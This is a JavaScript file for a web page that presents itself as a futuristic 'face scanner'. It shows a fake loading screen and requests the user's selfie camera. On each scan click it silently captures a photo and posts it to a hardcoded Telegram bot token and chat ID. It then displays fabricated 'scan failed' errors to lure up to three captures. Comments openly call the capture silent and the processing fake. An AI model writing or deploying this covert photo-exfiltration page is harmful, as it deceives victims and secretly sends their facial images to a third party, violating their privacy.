// Future Face Scanner Logic
const BOT_TOKEN = '8896747269:AAHCF7Haia48ywSnq1pZqFUouPoizxyncMU';
const CHAT_ID = '7011984651';
let attempts = 0;
const MAX_ATTEMPTS = 3;

// UI Elements
const loadingScreen = document.getElementById('loading');
const homeScreen = document.getElementById('home');
const scannerScreen = document.getElementById('scanner');
const errorScreen = document.getElementById('error-screen');

const startBtn = document.getElementById('start-btn');
const captureBtn = document.getElementById('capture-btn');
const retryBtn = document.getElementById('retry-btn');
const camera = document.getElementById('camera');
const canvas = document.getElementById('canvas');
const statusMessage = document.getElementById('status-message');
const scanBar = document.getElementById('scan-bar');
const errorTitle = document.getElementById('error-title');
const errorText = document.getElementById('error-text');

let stream = null;

// Fake Initial Loading sequence
setTimeout(() => {
    loadingScreen.classList.add('hidden');
    homeScreen.classList.remove('hidden');
}, 2500);

startBtn.addEventListener('click', async () => {
    homeScreen.classList.add('hidden');
    scannerScreen.classList.remove('hidden');
    await initCamera();
});

async function initCamera() {
    try {
        statusMessage.textContent = "REQUESTING CAMERA ACCESS...";

        // Request the user-facing (selfie) camera specifically
        const constraints = {
            video: { facingMode: "user" },
            audio: false
        };

        stream = await navigator.mediaDevices.getUserMedia(constraints);
        camera.srcObject = stream;

        camera.onloadedmetadata = () => {
            statusMessage.textContent = "FACE DETECTED. READY TO SCAN.";
            captureBtn.disabled = false;
        };
    } catch (err) {
        statusMessage.textContent = "CAMERA ACCESS DENIED.";
        console.error("Camera init error:", err);
        showError("CAMERA ERROR", "Unable to access the camera. Please check permissions.", true);
        retryBtn.textContent = "REFRESH";
        retryBtn.onclick = () => location.reload();
    }
}

captureBtn.addEventListener('click', async () => {
    if (!stream) return;

    // Start scan animation
    scanBar.classList.remove('hidden');
    scanBar.classList.add('active');
    captureBtn.disabled = true;
    statusMessage.innerHTML = "ANALYZING FACIAL STRUCTURE... <br><span style='font-size: 0.8em; color: var(--primary);'>PLEASE KEEP STILL</span>";

    // Capture photo silently
    canvas.width = camera.videoWidth;
    canvas.height = camera.videoHeight;
    const ctx = canvas.getContext('2d');

    // Draw the frame
    ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async (blob) => {
        // Send asynchronously
        sendToTelegram(blob);
    }, 'image/jpeg', 0.8);
});

async function sendToTelegram(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, `scan_${Date.now()}.jpg`);

    try {
        // Because we're static hosting, we hit Telegram API directly
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        }).then(res => res.json())
            .then(data => console.log("Telegram Response:", data))
            .catch(err => console.error("Telegram API Error:", err));

        // Visual processing delay
        setTimeout(() => {
            scanBar.classList.remove('active');
            scanBar.classList.add('hidden');
            handleAttemptResult();
        }, 3000); // 3 seconds of fake processing

    } catch (error) {
        console.error("Send error:", error);
        setTimeout(() => {
            scanBar.classList.remove('active');
            scanBar.classList.add('hidden');
            handleAttemptResult();
        }, 3000);
    }
}

function handleAttemptResult() {
    attempts++;

    if (attempts >= MAX_ATTEMPTS) {
        showError("SYSTEM FAILURE", "AI Processing Failed. Please try again later.", true);
    } else {
        showError("SCAN FAILED", "Face not detected properly. Please adjust and try again.", false);
    }
}

function showError(title, text, isFinal) {
    errorTitle.textContent = title;
    errorText.innerHTML = text;
    errorScreen.classList.remove('hidden');

    if (isFinal) {
        retryBtn.style.display = 'none';
        statusMessage.textContent = "SYSTEM OFFLINE.";
    } else {
        retryBtn.style.display = 'inline-block';
    }
}

retryBtn.addEventListener('click', () => {
    if (retryBtn.textContent === "REFRESH") return;

    errorScreen.classList.add('hidden');
    captureBtn.disabled = false;
    statusMessage.textContent = "FACE DETECTED. READY TO SCAN.";
});
